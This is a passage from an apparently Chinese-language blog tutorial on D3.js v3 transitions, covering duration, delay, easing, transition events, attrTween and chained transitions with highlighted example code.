.attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> (i + <span class=\"number\">1</span>) * <span class=\"number\">40</span>)</span><br><span class=\"line\">    .text(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;bounce&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">500</span>)</span><br><span class=\"line\">.filter(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data === <span class=\"string\">&#x27;Cat&#x27;</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">600</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"监听过渡事件\"><a href=\"#监听过渡事件\" class=\"headerlink\" title=\"监听过渡事件\"></a>监听过渡事件</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-item&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> (i + <span class=\"number\">1</span>) * <span class=\"number\">40</span>)</span><br><span class=\"line\">    .text(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;bounce&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">500</span>)</span><br><span class=\"line\">.filter(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data === <span class=\"string\">&#x27;Cat&#x27;</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">600</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;start&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123; <span class=\"comment\">// 动画开始</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(data.toUpperCase());</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;end&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 动画结束</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(<span class=\"string\">&#x27;end&#x27;</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .each(<span class=\"string\">&#x27;interrupt&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 动画被打断</span></span><br><span class=\"line\">        d3.select(<span class=\"built_in\">this</span>).text(<span class=\"string\">&#x27;interrupt&#x27;</span>);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">20</span>);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"过渡\"><a href=\"#过渡\" class=\"headerlink\" title=\"过渡\"></a>过渡</h1><p><code>d3.selection.trasition</code> 返回一个具备过渡能力的选集</p>\n<blockquote>\n<p><code>d3.selection.data(dataSet, fn)</code> 的第二个参数 <code>fn</code> 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。</p>\n</blockquote>\n<p>D3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。</p>\n<ul>\n<li>如果缺失起始值，它将试图使用计算出的样式</li>\n<li>如果缺失结束值，则将当前值作为常量</li>\n</ul>\n<h3 id=\"过渡效果\"><a href=\"#过渡效果\" class=\"headerlink\" title=\"过渡效果\"></a>过渡效果</h3><ul>\n<li><code>transition.duration(duration)</code>: <code>duration</code> 指定动画的持续时间，默认为 250ms，可传入具体数值或函数</li>\n<li><code>transition.delay(delay)</code>: <code>delay</code> 指定动画的延迟时间，默认为 0， 可传入具体数值或函数</li>\n<li><code>transition.ease(type)</code>: <code>type</code> 指定动画的缓动函数，默认缓动函数是 <code>cubic-in-out</code>，不可传入函数（通过使用 <code>attrTween</code> 或 <code>styleTween</code> 插值器中内置的定制缓动功能）<ul>\n<li>缓动模式: <code>lnear</code>、<code>cubic</code>、<code>cubic-in-out</code>、<code>sin</code>、<code>sin-out</code>、<code>exp</code>、<code>circle</code>、<code>back</code>、<code>bounce</code></li>\n<li>缓动模式修饰符: <code>in</code>、 <code>out</code>、 <code>in-out</code>、 <code>out-in</code></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .rect-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">30</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = [];</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> id = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> rects = container.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .data(data, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data.id);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\">                .domain([0, data.length])</span><br><span class=\"line\">                .range([0, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">                .domain([<span class=\"number\">0</span>, d3.max(data, <span class=\"function\">(<span class=\"params\">d</span>) =&gt;</span> d.value)])</span></span><br><span class=\"line\">                .range([h - padding * 2, 0]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// update</span></span></span><br><span class=\"line\"><span class=\"javascript\">            rects.attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-item&#x27;</span>)</span></span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> xScale(i))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> yScale(data.value))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> h - padding - yScale(data.value));  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// enter</span></span></span><br><span class=\"line\">            rects.enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(0, 100)&#x27;</span>)</span></span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\">                .delay(200)</span><br><span class=\"line\"><span class=\"javascript\">                .ease(<span class=\"string\">&#x27;ease-in-out&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> xScale(i))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> yScale(data.value))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(0, 40)&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> h - padding - yScale(data.value));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// exit</span></span></span><br><span class=\"line\">            rects.exit()</span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, -<span class=\"number\">40</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\">                .remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getRandomData</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.round(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">20</span>) + <span class=\"number\">5</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">15</span>; i++) &#123;</span></span><br><span class=\"line\">            dataSet.push(&#123;</span><br><span class=\"line\">                id: ++id,</span><br><span class=\"line\">                value: getRandomData()</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        render(dataSet);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">window</span>.setInterval(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\">            dataSet.shift();</span><br><span class=\"line\">            dataSet.push(&#123;</span><br><span class=\"line\">                id: ++id,</span><br><span class=\"line\">                value: getRandomData()</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            render(dataSet);</span><br><span class=\"line\">        &#125;, 2000);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"中间帧动画\"><a href=\"#中间帧动画\" class=\"headerlink\" title=\"中间帧动画\"></a>中间帧动画</h3><ul>\n<li><code>attrTween(name, tween)</code>: 据指定的补间函数 <code>tween</code>，通过指定的名称过渡属性值</li>\n<li><code>styleTween(name, tween)</code>: 据指定的补间函数 <code>tween</code>，通过指定的 CSS 样式的属性值</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        rect &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">widthTween</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> quantize = d3.scale.quantize()</span></span><br><span class=\"line\">                .domain([0, 1])</span><br><span class=\"line\">                .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">t</span>) =&gt;</span> quantize(t);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">            .duration(4000)</span><br><span class=\"line\"><span class=\"javascript\">            .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">400</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">60</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">            .duration(4000)</span><br><span class=\"line\"><span class=\"javascript\">            .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attrTween(<span class=\"string\">&#x27;width&#x27;</span>, widthTween);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"联级过渡\"><a href=\"#联级过渡\" class=\"headerlink\" title=\"联级过渡\"></a>联级过渡</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span 